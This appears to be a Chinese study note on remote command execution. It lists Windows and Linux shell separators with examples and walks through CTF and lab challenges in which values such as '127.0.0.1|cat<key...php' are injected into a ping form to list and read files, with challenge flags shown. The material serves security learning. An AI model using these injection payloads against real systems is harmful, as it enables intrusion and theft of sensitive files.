#### RCE

remote command|code execute，用户输入的参数将被用来执行系统命令或当作脚本执行，而攻击者传递恶意参数来查看敏感文件，进而控制后台系统

Windows系列支持的管道符如下所示：

“|” : 直接执行后面的语句。例如：ping 127.0.0.1| whoami
“||” : 如果前面执行的语句执行出错，则执行后面的语句，前面的语句只能为假。例如： ping 1234.1 || whoami
“&” : 如果前面的语句为假则直接执行后面的语句，前面的语句可真可假 。例如： ping 127.0.0.1 & whoami
“&&” : 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如： ping 127.0.0.1 && whoami



Linux系统支持的管道符如下所示：

“;” : 执行完前面的语句再执行后面的。 例如： ping 127.0.0.1 ; whoami
“|” : 显示后面语句的执行结果。列如：ping 127.0.0.1 | whoami.
“||” : 当前的语句执行出错时，执行后面的语句。 例如： ping 1472.1 || whoami
“&” : 如果前面得语句为假则直接执行后面的语句，前面的语句可真可假，例如：ping 127.0.0.1 | & whoami
“&&” : 如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。例如： ping 127.0.0.1 && whoami



1. [攻防世界 (xctf.org.cn)](https://adworld.xctf.org.cn/challenges/details?hash=64f69abb-bca4-4731-bedc-19fef5443e0b_2&task_category_id=3)command_execution

   1. 网页显示ping功能，输入：127.0.0.1|ls

      回显：index.php

   2. 输入：127.0.0.1|ls /home

      回显：flag.txt

   3. 输入 cat /home/flag.txt

      回显：cyberpeace{1d347f1ef8bd6d836aa52622283dda39}

2. [命令注入执行分析_命令执行_在线靶场_墨者学院_专注于网络安全人才培养 (mozhe.cn)](https://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGxaL0JjUT09bW96aGUmozhe)

   1. 网页显示ping功能，输入：127.0.0.1|ls

      弹窗显示IP格式不正确

      禁用前端js脚本

   2. 输入：127.0.0.1|ls

      回显：

      index.php
      key_2805693832572.php
      static

   3. 输入：127.0.0.1|cat key_2805693832572.php

      没有回显

   4. 重定向，输入127.0.0.1|cat<key_2805693832572.php

      回显：mozhe8329ad754d65f846b468a5a4016

3. pikachu_windows本地靶场:

   1. 输入：127.0.0.1|dir

      cmd编码方式为gbk，浏览器默认utf-8，中文乱码，不过不影响英文

   2. Type 对应文件即可查看

4. pikachu_RCE_eval函数：输入php代码，php代码就被执行了



